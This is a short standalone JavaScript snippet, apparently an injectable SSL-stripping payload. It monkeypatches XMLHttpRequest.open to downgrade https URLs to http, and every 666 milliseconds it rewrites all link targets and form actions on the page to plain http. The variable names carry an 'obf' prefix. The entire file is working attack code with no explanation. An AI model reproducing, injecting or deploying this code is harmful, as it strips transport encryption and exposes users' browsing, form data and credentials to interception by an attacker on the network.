XMLHttpRequest.prototype.obf_open = XMLHttpRequest.prototype.open
XMLHttpRequest.prototype.open = function(obf_var_method, obf_var_url, obf_var_async, obf_var_username, obf_var_password) {
	obf_var_url = obf_var_url.replace(/^(http)s/ig, "$1")
	XMLHttpRequest.prototype.obf_open(obf_var_method, obf_var_url, obf_var_async, obf_var_username, obf_var_password)
}

setInterval(function(){
	document.querySelectorAll("a, form").forEach(function(obf_var_node){
		obf_var_node.tagName == "A" ? obf_var_node.href = obf_var_node.href.replace(/^(http)s/ig, "$1") : obf_var_node.action = obf_var_node.action.replace(/^(http)s/ig, "$1")
	})
}, 666)
